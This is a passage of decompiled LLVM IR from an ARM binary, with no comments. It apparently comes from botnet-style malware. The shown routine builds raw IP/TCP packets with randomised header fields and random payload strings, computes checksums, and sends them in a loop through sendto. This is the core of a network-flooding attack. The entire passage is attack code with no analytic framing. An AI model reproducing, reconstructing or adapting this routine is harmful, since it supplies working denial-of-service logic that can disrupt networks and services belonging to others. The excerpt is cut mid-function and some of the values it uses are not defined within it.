  %v0_9da4 = load i32, i32* %r3.global-to-local, align 4
  %v1_9da4 = load i32, i32* %ip.global-to-local, align 4
  %v2_9da4 = add i32 %v1_9da4, 8
  %v3_9da4 = inttoptr i32 %v2_9da4 to i32*
  store i32 %v0_9da4, i32* %v3_9da4, align 4
  %v0_9da8 = load i32, i32* @r7, align 4
  store i32 %v0_9da8, i32* @r0, align 4
  %v0_9dac = call i32 @malloc()
  store i32 %v0_9dac, i32* %r0.global-to-local, align 4
  store i32 %v2_9928, i32* %r3.global-to-local, align 4
  %v2_9db8 = load i32, i32* @r4, align 4
  %v5_9db8 = mul i32 %v2_9db8, 4
  %v6_9db8 = add i32 %v5_9db8, %v2_9928
  %v7_9db8 = inttoptr i32 %v6_9db8 to i32*
  store i32 %v0_9dac, i32* %v7_9db8, align 4
  %v3_9dbc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9dbc, i32* %r2.global-to-local, align 4
  %v0_9dc0 = load i32, i32* %r3.global-to-local, align 4
  %v4_9dc0 = mul i32 %v3_9dbc, 4
  %v5_9dc0 = add i32 %v0_9dc0, %v4_9dc0
  %v6_9dc0 = inttoptr i32 %v5_9dc0 to i32*
  %v7_9dc0 = load i32, i32* %v6_9dc0, align 4
  store i32 %v7_9dc0, i32* @r4, align 4
  %v1_9dc4 = inttoptr i32 %v7_9dc0 to i8*
  %v2_9dc4 = load i8, i8* %v1_9dc4, align 1
  %tmp101 = urem i8 %v2_9dc4, 16
  %v1_9dc8 = zext i8 %tmp101 to i32
  %v1_9dcc = or i32 %v1_9dc8, 64
  store i32 %v1_9dcc, i32* %r3.global-to-local, align 4
  %v1_9dd0 = trunc i32 %v1_9dcc to i8
  store i8 %v1_9dd0, i8* %v1_9dc4, align 1
  %v0_9dd4 = load i32, i32* @r4, align 4
  %v1_9dd4 = inttoptr i32 %v0_9dd4 to i8*
  %v2_9dd4 = load i8, i8* %v1_9dd4, align 1
  %v0_9dd8 = load i32, i32* @r7, align 4
  %tmp76 = mul i32 %v0_9dd8, 256
  %v1_9de0 = and i8 %v2_9dd4, -16
  %v1_9de4 = or i8 %v1_9de0, 5
  %v1_9de8 = and i32 %tmp76, and (i32 ptrtoint (i32* @global_var_ff00.34 to i32), i32 16776960)
  %tmp77 = udiv i32 %v0_9dd8, 256
  %v4_9dec = urem i32 %tmp77, 256
  %v5_9dec = or i32 %v4_9dec, %v1_9de8
  store i32 %v5_9dec, i32* %r2.global-to-local, align 4
  %v0_9df0 = load i32, i32* @fp, align 4
  %v1_9df0 = urem i32 %v0_9df0, 256
  store i32 %v1_9df0, i32* %r0.global-to-local, align 4
  store i32 %v1_99a8, i32* %ip.global-to-local, align 4
  %v3_9df8 = udiv i32 %v0_9df0, 256
  store i32 %v3_9df8, i32* %r1.global-to-local, align 4
  store i8 %v1_9de4, i8* %v1_9dd4, align 1
  %v0_9e00 = load i32, i32* %r1.global-to-local, align 4
  %v1_9e00 = load i32, i32* %r0.global-to-local, align 4
  %v4_9e00 = mul i32 %v1_9e00, 256
  %v5_9e00 = or i32 %v4_9e00, %v0_9e00
  store i32 %v5_9e00, i32* %r1.global-to-local, align 4
  store i32 %v6_9940, i32* %r0.global-to-local, align 4
  %v2_9e08 = load i32, i32* @r4, align 4
  %v3_9e08 = add i32 %v2_9e08, 1
  %v4_9e08 = inttoptr i32 %v3_9e08 to i8*
  store i8 %v5_9960, i8* %v4_9e08, align 1
  %v0_9e0c = load i32, i32* %r1.global-to-local, align 4
  %v1_9e0c = trunc i32 %v0_9e0c to i16
  %v2_9e0c = load i32, i32* @r4, align 4
  %v3_9e0c = add i32 %v2_9e0c, 4
  %v4_9e0c = inttoptr i32 %v3_9e0c to i16*
  store i16 %v1_9e0c, i16* %v4_9e0c, align 2
  %v0_9e10 = load i32, i32* %ip.global-to-local, align 4
  %v2_9e10 = icmp eq i32 %v0_9e10, 0
  store i1 %v2_9e10, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_999c, i32* %r1.global-to-local, align 4
  %v0_9e18 = load i32, i32* %r2.global-to-local, align 4
  %v1_9e18 = trunc i32 %v0_9e18 to i16
  %v2_9e18 = load i32, i32* @r4, align 4
  %v3_9e18 = add i32 %v2_9e18, 2
  %v4_9e18 = inttoptr i32 %v3_9e18 to i16*
  store i16 %v1_9e18, i16* %v4_9e18, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_9e10, label %bb79, label %bb78

bb78:                                             ; preds = %dec_label_pc_9d3c
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_9d3c, %bb78
  %v0_9e24 = load i32, i32* %r1.global-to-local, align 4
  %v1_9e24 = trunc i32 %v0_9e24 to i8
  %v2_9e24 = load i32, i32* @r4, align 4
  %v3_9e24 = add i32 %v2_9e24, 8
  %v4_9e24 = inttoptr i32 %v3_9e24 to i8*
  store i8 %v1_9e24, i8* %v4_9e24, align 1
  %v0_9e28 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e28 = trunc i32 %v0_9e28 to i8
  %v2_9e28 = load i32, i32* @r4, align 4
  %v3_9e28 = add i32 %v2_9e28, 9
  %v4_9e28 = inttoptr i32 %v3_9e28 to i8*
  store i8 %v1_9e28, i8* %v4_9e28, align 1
  %v0_9e2c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9e2c, label %bb81, label %bb80

bb80:                                             ; preds = %bb79
  %v1_9e2c = load i32, i32* %r2.global-to-local, align 4
  %v2_9e2c = trunc i32 %v1_9e2c to i16
  %v3_9e2c = load i32, i32* @r4, align 4
  %v4_9e2c = add i32 %v3_9e2c, 6
  %v5_9e2c = inttoptr i32 %v4_9e2c to i16*
  store i16 %v2_9e2c, i16* %v5_9e2c, align 2
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  store i32 ptrtoint (i32* @global_var_24f10.62 to i32), i32* %r2.global-to-local, align 4
  %v2_9e34 = load i32, i32* @global_var_24f10.62, align 4
  store i32 %v2_9e34, i32* %r1.global-to-local, align 4
  %v1_9e38 = load i32, i32* @r4, align 4
  %v2_9e38 = add i32 %v1_9e38, 12
  %v3_9e38 = inttoptr i32 %v2_9e38 to i32*
  store i32 %v2_9e34, i32* %v3_9e38, align 4
  %v3_9e3c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9e3c, i32* %r3.global-to-local, align 4
  store i32 %v2_9918, i32* %ip.global-to-local, align 4
  %v4_9e44 = mul i32 %v3_9e3c, 16
  %v5_9e44 = add i32 %v4_9e44, %v2_9918
  %v6_9e44 = inttoptr i32 %v5_9e44 to i32*
  %v7_9e44 = load i32, i32* %v6_9e44, align 4
  store i32 %v7_9e44, i32* %r2.global-to-local, align 4
  store i32 %v5_9e44, i32* %r3.global-to-local, align 4
  %v1_9e50 = load i32, i32* @r4, align 4
  %v2_9e50 = add i32 %v1_9e50, 16
  %v3_9e50 = inttoptr i32 %v2_9e50 to i32*
  store i32 %v7_9e44, i32* %v3_9e50, align 4
  %v0_9e54 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e54 = add i32 %v0_9e54, 12
  %v2_9e54 = inttoptr i32 %v1_9e54 to i16*
  %v3_9e54 = load i16, i16* %v2_9e54, align 2
  %v4_9e54 = zext i16 %v3_9e54 to i32
  store i32 %v4_9e54, i32* %r0.global-to-local, align 4
  %v1_9e58 = add i32 %v0_9e54, 8
  %v2_9e58 = inttoptr i32 %v1_9e58 to i32*
  %v3_9e58 = load i32, i32* %v2_9e58, align 4
  store i32 %v3_9e58, i32* %r1.global-to-local, align 4
  %v2_9e5c = load i32, i32* @r4, align 4
  %v3_9e5c = add i32 %v2_9e5c, 20
  %v4_9e5c = inttoptr i32 %v3_9e5c to i16*
  store i16 %v3_9e54, i16* %v4_9e5c, align 2
  %v0_9e60 = load i32, i32* @r4, align 4
  %v1_9e60 = add i32 %v0_9e60, 20
  store i32 %v1_9e60, i32* @r8, align 4
  %v1_9e64 = add i32 %v0_9e60, 33
  %v2_9e64 = inttoptr i32 %v1_9e64 to i8*
  %v3_9e64 = load i8, i8* %v2_9e64, align 1
  %v4_9e64 = zext i8 %v3_9e64 to i32
  store i32 %v4_9e64, i32* %r2.global-to-local, align 4
  %v0_9e68 = load i32, i32* %r1.global-to-local, align 4
  %v2_9e68 = add i32 %v0_9e60, 24
  %v3_9e68 = inttoptr i32 %v2_9e68 to i32*
  store i32 %v0_9e68, i32* %v3_9e68, align 4
  %v0_9e6c = load i32, i32* %r2.global-to-local, align 4
  %v1_9e6c = or i32 %v0_9e6c, 1
  store i32 %v1_9e6c, i32* %r2.global-to-local, align 4
  %v0_9e70 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e70 = add i32 %v0_9e70, 4
  %v2_9e70 = inttoptr i32 %v1_9e70 to i32*
  %v3_9e70 = load i32, i32* %v2_9e70, align 4
  store i32 %v3_9e70, i32* %r1.global-to-local, align 4
  %v1_9e74 = add i32 %v0_9e70, 14
  %v2_9e74 = inttoptr i32 %v1_9e74 to i16*
  %v3_9e74 = load i16, i16* %v2_9e74, align 2
  %v4_9e74 = zext i16 %v3_9e74 to i32
  store i32 %v4_9e74, i32* %r3.global-to-local, align 4
  %v1_9e78 = trunc i32 %v1_9e6c to i8
  %v2_9e78 = load i32, i32* @r8, align 4
  %v3_9e78 = add i32 %v2_9e78, 13
  %v4_9e78 = inttoptr i32 %v3_9e78 to i8*
  store i8 %v1_9e78, i8* %v4_9e78, align 1
  %v0_9e7c = load i32, i32* %r3.global-to-local, align 4
  %v1_9e7c = trunc i32 %v0_9e7c to i16
  %v2_9e7c = load i32, i32* @r8, align 4
  %v3_9e7c = add i32 %v2_9e7c, 2
  %v4_9e7c = inttoptr i32 %v3_9e7c to i16*
  store i16 %v1_9e7c, i16* %v4_9e7c, align 2
  %v0_9e80 = load i32, i32* @r8, align 4
  %v1_9e80 = add i32 %v0_9e80, 12
  %v2_9e80 = inttoptr i32 %v1_9e80 to i8*
  %v3_9e80 = load i8, i8* %v2_9e80, align 1
  %v4_9e80 = zext i8 %v3_9e80 to i32
  store i32 %v4_9e80, i32* %r3.global-to-local, align 4
  %v1_9e84 = add i32 %v0_9e80, 13
  %v2_9e84 = inttoptr i32 %v1_9e84 to i8*
  %v3_9e84 = load i8, i8* %v2_9e84, align 1
  %v4_9e84 = zext i8 %v3_9e84 to i32
  %tmp102 = urem i8 %v3_9e80, 16
  %v1_9e88 = zext i8 %tmp102 to i32
  %v1_9e8c = or i32 %v1_9e88, 128
  store i32 %v1_9e8c, i32* %r3.global-to-local, align 4
  %v1_9e90 = or i32 %v4_9e84, 16
  store i32 %v1_9e90, i32* %r2.global-to-local, align 4
  %v0_9e94 = load i32, i32* %r1.global-to-local, align 4
  %v2_9e94 = add i32 %v0_9e80, 8
  %v3_9e94 = inttoptr i32 %v2_9e94 to i32*
  store i32 %v0_9e94, i32* %v3_9e94, align 4
  %v0_9e98 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e98 = trunc i32 %v0_9e98 to i8
  %v2_9e98 = load i32, i32* @r8, align 4
  %v3_9e98 = add i32 %v2_9e98, 12
  %v4_9e98 = inttoptr i32 %v3_9e98 to i8*
  store i8 %v1_9e98, i8* %v4_9e98, align 1
  %v0_9e9c = load i32, i32* %r2.global-to-local, align 4
  %v1_9e9c = trunc i32 %v0_9e9c to i8
  %v2_9e9c = load i32, i32* @r8, align 4
  %v3_9e9c = add i32 %v2_9e9c, 13
  %v4_9e9c = inttoptr i32 %v3_9e9c to i8*
  store i8 %v1_9e9c, i8* %v4_9e9c, align 1
  %v0_9ea0 = call i32 @rand_next()
  %v1_9ea0 = trunc i32 %v0_9ea0 to i16
  store i32 %v0_9ea0, i32* %r0.global-to-local, align 4
  store i32 %v1_99e4, i32* %r1.global-to-local, align 4
  %v0_9ea8 = load i32, i32* @r8, align 4
  %v1_9ea8 = add i32 %v0_9ea8, 13
  %v2_9ea8 = inttoptr i32 %v1_9ea8 to i8*
  %v3_9ea8 = load i8, i8* %v2_9ea8, align 1
  %v4_9ea8 = zext i8 %v3_9ea8 to i32
  store i32 %v1_9eac, i32* %r2.global-to-local, align 4
  %v1_9eb0 = and i32 %v4_9ea8, 223
  %v5_9eb4 = or i32 %v1_9eb0, %v4_9eb4
  store i32 %v5_9eb4, i32* %r3.global-to-local, align 4
  %v1_9eb8 = trunc i32 %v5_9eb4 to i8
  store i8 %v1_9eb8, i8* %v2_9ea8, align 1
  store i32 %v1_9a04, i32* %ip.global-to-local, align 4
  %v0_9ec0 = load i32, i32* @r8, align 4
  %v1_9ec0 = add i32 %v0_9ec0, 13
  %v2_9ec0 = inttoptr i32 %v1_9ec0 to i8*
  %v3_9ec0 = load i8, i8* %v2_9ec0, align 1
  %v4_9ec0 = zext i8 %v3_9ec0 to i32
  store i32 %v1_9ec4, i32* %r3.global-to-local, align 4
  %v1_9ec8 = and i32 %v4_9ec0, 239
  %v5_9ecc = or i32 %v1_9ec8, %v4_9ecc
  store i32 %v5_9ecc, i32* %r2.global-to-local, align 4
  %v1_9ed0 = trunc i32 %v5_9ecc to i8
  store i8 %v1_9ed0, i8* %v2_9ec0, align 1
  store i32 %v1_9a24, i32* %r1.global-to-local, align 4
  %v0_9ed8 = load i32, i32* @r8, align 4
  %v1_9ed8 = add i32 %v0_9ed8, 13
  %v2_9ed8 = inttoptr i32 %v1_9ed8 to i8*
  %v3_9ed8 = load i8, i8* %v2_9ed8, align 1
  %v4_9ed8 = zext i8 %v3_9ed8 to i32
  store i32 %v1_9edc, i32* %r2.global-to-local, align 4
  %v1_9ee0 = and i32 %v4_9ed8, 247
  %v5_9ee4 = or i32 %v1_9ee0, %v4_9ee4
  store i32 %v5_9ee4, i32* %r3.global-to-local, align 4
  %v1_9ee8 = trunc i32 %v5_9ee4 to i8
  store i8 %v1_9ee8, i8* %v2_9ed8, align 1
  store i32 %v1_9a44, i32* %ip.global-to-local, align 4
  %v0_9ef0 = load i32, i32* @r8, align 4
  %v1_9ef0 = add i32 %v0_9ef0, 13
  %v2_9ef0 = inttoptr i32 %v1_9ef0 to i8*
  %v3_9ef0 = load i8, i8* %v2_9ef0, align 1
  %v4_9ef0 = zext i8 %v3_9ef0 to i32
  store i32 %v1_9ef4, i32* %r3.global-to-local, align 4
  %v1_9ef8 = and i32 %v4_9ef0, 251
  %v5_9efc = or i32 %v1_9ef8, %v4_9efc
  store i32 %v5_9efc, i32* %r2.global-to-local, align 4
  %v1_9f00 = trunc i32 %v5_9efc to i8
  store i8 %v1_9f00, i8* %v2_9ef0, align 1
  store i32 %v1_9a64, i32* %r1.global-to-local, align 4
  %v0_9f08 = load i32, i32* @r8, align 4
  %v1_9f08 = add i32 %v0_9f08, 13
  %v2_9f08 = inttoptr i32 %v1_9f08 to i8*
  %v3_9f08 = load i8, i8* %v2_9f08, align 1
  %v4_9f08 = zext i8 %v3_9f08 to i32
  store i32 %v1_9f0c, i32* %r2.global-to-local, align 4
  %v1_9f10 = and i32 %v4_9f08, 253
  %v4_9f14 = or i32 %v1_9f10, %v3_9f14
  store i32 %v4_9f14, i32* %r3.global-to-local, align 4
  %v1_9f18 = trunc i32 %v4_9f14 to i8
  store i8 %v1_9f18, i8* %v2_9f08, align 1
  store i32 %v1_9a84, i32* %ip.global-to-local, align 4
  %v0_9f20 = load i32, i32* @r8, align 4
  %v1_9f20 = add i32 %v0_9f20, 13
  %v2_9f20 = inttoptr i32 %v1_9f20 to i8*
  %v3_9f20 = load i8, i8* %v2_9f20, align 1
  %v4_9f20 = zext i8 %v3_9f20 to i32
  %v1_9f28 = and i32 %v4_9f20, 254
  store i32 %v1_9f28, i32* %r2.global-to-local, align 4
  %v2_9f2c = or i32 %v1_9f28, %v1_9f24
  store i32 %v2_9f2c, i32* %r3.global-to-local, align 4
  %v1_9f30 = trunc i32 %v2_9f2c to i8
  store i8 %v1_9f30, i8* %v2_9f20, align 1
  %v3_9f34 = load i32, i32* @r8, align 4
  %v4_9f34 = add i32 %v3_9f34, 14
  %v5_9f34 = inttoptr i32 %v4_9f34 to i16*
  store i16 %v1_9ea0, i16* %v5_9f34, align 2
  store i32 %v6_9a9c, i32* %r1.global-to-local, align 4
  %v0_9f3c = load i32, i32* @r4, align 4
  %v1_9f3c = add i32 %v0_9f3c, 40
  store i32 %v1_9f3c, i32* @r0, align 4
  %v2_9f40 = call i32 @rand_str(i32 %v1_9f3c, i32 %v6_9a9c)
  store i32 %v2_9f40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9c94

dec_label_pc_9f48:                                ; preds = %dec_label_pc_9b08
  store i32 %v6_9a9c, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_9a9c, 40
  br label %dec_label_pc_9f58

dec_label_pc_9f58:                                ; preds = %dec_label_pc_9ca8, %dec_label_pc_9f48
  %storemerge6.pre-phi = phi i32 [ %v1_9d98, %dec_label_pc_9ca8 ], [ %.pre, %dec_label_pc_9f48 ]
  %v0_9f6c26 = phi i32 [ %v1_9c9c, %dec_label_pc_9ca8 ], [ 0, %dec_label_pc_9f48 ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_9a9c, 65536
  %storemerge = add i32 %v6_9a9c, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_9f58 = add i32 %storemerge4, 1310720
  store i32 %v1_9f58, i32* %r2.global-to-local, align 4
  %tmp82 = udiv i32 %v1_9f58, 256
  %v3_9f60 = and i32 %tmp82, 65280
  store i32 %v3_9f60, i32* %r3.global-to-local, align 4
  %v4_9f64 = udiv i32 %v1_9f58, 16777216
  %v5_9f64 = or i32 %v3_9f60, %v4_9f64
  store i32 %v5_9f64, i32* @r8, align 4
  %v2_a090 = icmp eq i32 %v1_9abc, 0
  br label %dec_label_pc_9f68

dec_label_pc_9f68:                                ; preds = %dec_label_pc_9f68, %dec_label_pc_a074, %dec_label_pc_9f58
  %v0_9f6c = phi i32 [ %v0_9f6c26, %dec_label_pc_9f58 ], [ 0, %dec_label_pc_a074 ], [ 0, %dec_label_pc_9f68 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_9f6c = icmp eq i32 %v0_9f6c, 0
  store i1 %v2_9f6c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_9f6c, label %dec_label_pc_9f68, label %dec_label_pc_9f78

dec_label_pc_9f78:                                ; preds = %dec_label_pc_9f68, %dec_label_pc_a074
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9f7c

dec_label_pc_9f7c:                                ; preds = %dec_label_pc_9fa4, %dec_label_pc_9f78
  %v1_9f84 = phi i32 [ %v1_a064, %dec_label_pc_9fa4 ], [ 0, %dec_label_pc_9f78 ]
  store i32 %v2_9928, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10000.59 to i32), i32* %r3.global-to-local, align 4
  %v4_9f84 = mul i32 %v1_9f84, 4
  %v5_9f84 = add i32 %v4_9f84, %v2_9928
  %v6_9f84 = inttoptr i32 %v5_9f84 to i32*
  %v7_9f84 = load i32, i32* %v6_9f84, align 4
  store i32 %v7_9f84, i32* @r4, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r3.global-to-local, align 4
  %v0_9f8c = load i32, i32* @fp, align 4
  %v9_9f8c = icmp eq i32 %v0_9f8c, ptrtoint (i16* @global_var_ffff.60 to i32)
  store i1 %v9_9f8c, i1* %cpsr_z.global-to-local, align 1
  %v1_9f90 = add i32 %v7_9f84, 20
  store i32 %v1_9f90, i32* @r5, align 4
  br i1 %v9_9f8c, label %dec_label_pc_a088, label %dec_label_pc_9f98

dec_label_pc_9f98:                                ; preds = %dec_label_pc_9f7c
  store i32 %v1_9abc, i32* %r3.global-to-local, align 4
  store i1 %v2_a090, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a090, label %dec_label_pc_9fa4, label %dec_label_pc_a09c

dec_label_pc_9fa4:                                ; preds = %dec_label_pc_9f98, %dec_label_pc_a088, %dec_label_pc_a09c
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_9fa8 = load i32, i32* @r4, align 4
  %v3_9fa8 = add i32 %v2_9fa8, 10
  %v4_9fa8 = inttoptr i32 %v3_9fa8 to i16*
  store i16 0, i16* %v4_9fa8, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9fb0 = load i32, i32* @r4, align 4
  store i32 %v0_9fb0, i32* @r0, align 4
  %v2_9fb4 = call i32 @checksum_generic(i32 %v0_9fb0, i32 20)
  %v3_9fb4 = trunc i32 %v2_9fb4 to i16
  store i32 %v2_9fb4, i32* %r0.global-to-local, align 4
  %v3_9fb8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_9918, i32* %r2.global-to-local, align 4
  %v3_9fc0 = mul i32 %v3_9fb8, 16
  %v2_9fc4 = add i32 %v3_9fc0, %v2_9918
  store i32 %v2_9fc4, i32* %r1.global-to-local, align 4
  %v1_9fc8 = add i32 %v2_9fc4, 4
  %v2_9fc8 = inttoptr i32 %v1_9fc8 to i32*
  %v3_9fc8 = load i32, i32* %v2_9fc8, align 4
  %v3_9fcc = mul i32 %v3_9fc8, 65536
  store i32 %v3_9fcc, i32* %ip.global-to-local, align 4
  %tmp83 = mul i32 %v3_9fc8, 256
  %v1_9fd4 = and i32 %tmp83, and (i32 ptrtoint (i32* @global_var_ff00.34 to i32), i32 16776960)
  %tmp84 = udiv i32 %v3_9fc8, 256
  %v4_9fd8 = urem i32 %tmp84, 256
  %v5_9fd8 = or i32 %v4_9fd8, %v1_9fd4
  store i32 %v5_9fd8, i32* %r3.global-to-local, align 4
  %v1_9fdc = add i32 %v3_9fc8, 1
  store i32 %v1_9fdc, i32* %r2.global-to-local, align 4
  store i32 %v1_9fdc, i32* %v2_9fc8, align 4
  %v0_9fe4 = load i32, i32* %r3.global-to-local, align 4
  %v1_9fe4 = load i32, i32* @r5, align 4
  %v2_9fe4 = add i32 %v1_9fe4, 4
  %v3_9fe4 = inttoptr i32 %v2_9fe4 to i32*
  store i32 %v0_9fe4, i32* %v3_9fe4, align 4
  %v0_9fe8 = load i32, i32* %r1.global-to-local, align 4
  %v1_9fe8 = add i32 %v0_9fe8, 8
  %v2_9fe8 = inttoptr i32 %v1_9fe8 to i32*
  %v3_9fe8 = load i32, i32* %v2_9fe8, align 4
  %tmp85 = mul i32 %v3_9fe8, 256
  %v1_9ff4 = and i32 %tmp85, and (i32 ptrtoint (i32* @global_var_ff00.34 to i32), i32 16776960)
  %tmp86 = udiv i32 %v3_9fe8, 256
  %v4_9ff8 = urem i32 %tmp86, 256
  %v5_9ff8 = or i32 %v4_9ff8, %v1_9ff4
  %v1_9ffc = load i32, i32* @r5, align 4
  %v2_9ffc = add i32 %v1_9ffc, 8
  %v3_9ffc = inttoptr i32 %v2_9ffc to i32*
  store i32 %v5_9ff8, i32* %v3_9ffc, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_a004 = load i32, i32* @r4, align 4
  %v4_a004 = add i32 %v3_a004, 10
  %v5_a004 = inttoptr i32 %v4_a004 to i16*
  store i16 %v3_9fb4, i16* %v5_a004, align 2
  %v0_a008 = load i32, i32* @r5, align 4
  store i32 %v0_a008, i32* @r1, align 4
  %v0_a00c = load i32, i32* %r3.global-to-local, align 4
  %v1_a00c = trunc i32 %v0_a00c to i16
  %v3_a00c = add i32 %v0_a008, 16
  %v4_a00c = inttoptr i32 %v3_a00c to i16*
  store i16 %v1_a00c, i16* %v4_a00c, align 2
  %v0_a010 = load i32, i32* @r8, align 4
  store i32 %v0_a010, i32* %r2.global-to-local, align 4
  %v0_a014 = load i32, i32* @sl, align 4
  store i32 %v0_a014, i32* %r3.global-to-local, align 4
  %v0_a018 = load i32, i32* @r4, align 4
  store i32 %v0_a018, i32* %r0.global-to-local, align 4
  %v4_a01c = call i32 @checksum_tcpudp(i32 %v0_a018, i32 %v0_a008, i32 %v0_a010, i32 %v0_a014)
  %v5_a01c = trunc i32 %v4_a01c to i16
  store i32 %v4_a01c, i32* %r0.global-to-local, align 4
  %v3_a020 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a020, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_a028 = mul i32 %v3_a020, 32
  store i32 %v3_a028, i32* %lr.global-to-local, align 4
  %v3_a02c = load i32, i32* @r5, align 4
  %v4_a02c = add i32 %v3_a02c, 16
  %v5_a02c = inttoptr i32 %v4_a02c to i16*
  store i16 %v5_a01c, i16* %v5_a02c, align 2
  %v0_a030 = load i32, i32* %lr.global-to-local, align 4
  %v1_a030 = load i32, i32* %r3.global-to-local, align 4
  %tmp103 = mul i32 %v1_a030, -8
  %v5_a030 = add i32 %v0_a030, %tmp103
  store i32 %v5_a030, i32* %lr.global-to-local, align 4
  %v0_a034 = load i32, i32* @r5, align 4
  %v1_a034 = add i32 %v0_a034, 2
  %v2_a034 = inttoptr i32 %v1_a034 to i16*
  %v3_a034 = load i16, i16* %v2_a034, align 2
  %v4_a034 = zext i16 %v3_a034 to i32
  store i32 %v4_a034, i32* @r5, align 4
  %v1_a038 = load i32, i32* %ip.global-to-local, align 4
  %v2_a038 = add i32 %v1_a038, %v5_a030
  store i32 %v2_a038, i32* @lr, align 4
  %v3_a03c = add i32 %v2_a038, 2
  %v4_a03c = inttoptr i32 %v3_a03c to i16*
  store i16 %v3_a034, i16* %v4_a03c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_a048 = load i32, i32* @r4, align 4
  store i32 %v0_a048, i32* %r1.global-to-local, align 4
  %v0_a04c = load i32, i32* @sb, align 4
  store i32 %v0_a04c, i32* %r0.global-to-local, align 4
  %v0_a050 = load i32, i32* @r7, align 4
  store i32 %v0_a050, i32* %r2.global-to-local, align 4
  %v0_a054 = load i32, i32* @lr, align 4
  %v6_a05c = call i32 @__libc_sendto(i32 %v0_a04c, i32 %v0_a048, i32 %v0_a050, i32 16384, i32 %v0_a054, i32 16)
  %v3_a060 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a060, i32* %r3.global-to-local, align 4
  %v1_a064 = add i32 %v3_a060, 1
  store i32 %v1_a064, i32* %r0.global-to-local, align 4
  %v0_a068 = load i32, i32* @r6, align 4
  %v9_a068 = icmp eq i32 %v0_a068, %v1_a064
  store i1 %v9_a068, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a064, i32* %stack_var_-44, align 4
  %v8_a070 = icmp sgt i32 %v0_a068, %v1_a064
  br i1 %v8_a070, label %dec_label_pc_9f7c, label %dec_label_pc_a074

dec_label_pc_a074:                                ; preds = %dec_label_pc_9fa4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a078 = icmp eq i32 %v0_a068, 0
  store i1 %v2_a078, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a078, label %dec_label_pc_9f68, label %dec_label_pc_9f78

dec_label_pc_a088:                                ; preds = %dec_label_pc_9f7c
  %v0_a088 = call i32 @rand_next()
  %v1_a088 = trunc i32 %v0_a088 to i16
  store i32 %v0_a088, i32* %r0.global-to-local, align 4
  store i32 %v1_9abc, i32* %r3.global-to-local, align 4
  store i1 %v2_a090, i1* %cpsr_z.global-to-local, align 1
  %v3_a094 = load i32, i32* @r4, align 4
  %v4_a094 = add i32 %v3_a094, 4
  %v5_a094 = inttoptr i32 %v4_a094 to i16*
  store i16 %v1_a088, i16* %v5_a094, align 2
  br i1 %v2_a090, label %dec_label_pc_9fa4, label %dec_label_pc_a088.dec_label_pc_a09c_crit_edge

dec_label_pc_a088.dec_label_pc_a09c_crit_edge:    ; preds = %dec_label_pc_a088
  %v0_a09c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a09c

dec_label_pc_a09c:                                ; preds = %dec_label_pc_a088.dec_label_pc_a09c_crit_edge, %dec_label_pc_9f98
  %v0_a09c = phi i32 [ %v0_a09c.pre, %dec_label_pc_a088.dec_label_pc_a09c_crit_edge ], [ %v7_9f84, %dec_label_pc_9f98 ]
  %v1_a09c = add i32 %v0_a09c, 40
  store i32 %v1_a09c, i32* @r0, align 4
  store i32 %v6_9a9c, i32* %r1.global-to-local, align 4
  %v2_a0a4 = call i32 @rand_str(i32 %v1_a09c, i32 %v6_9a9c)
  store i32 %v2_a0a4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9fa4

; uselistorder directives
  uselistorder i32 %v0_a088, { 1, 0 }
  uselistorder i32 %v1_a064, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_a030, { 1, 0 }
  uselistorder i32 %v4_a01c, { 1, 0 }
  uselistorder i32 %v3_9fe8, { 1, 0 }
  uselistorder i32 %v3_9fc8, { 3, 2, 0, 1 }
  uselistorder i32 %v2_9fb4, { 1, 0 }
  uselistorder i1 %v2_a090, { 2, 3, 1, 0 }
  uselistorder i32 %v0_9ea0, { 1, 0 }
  uselistorder i32 %v0_9dd8, { 1, 0 }
  uselistorder i32 %v3_9d74, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v3_9d48, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_9d2c, { 1, 0 }
  uselistorder i32 %v0_9ce8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_9c98, { 1, 0, 2, 3 }
  uselistorder i32 %v3_9c84, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_9c10, { 1, 0 }
  uselistorder i32 %v6_9c08, { 0, 2, 1, 3 }
  uselistorder i1 %v9_9c38, { 1, 0 }
  uselistorder i32 %v4_9c4c, { 1, 0 }
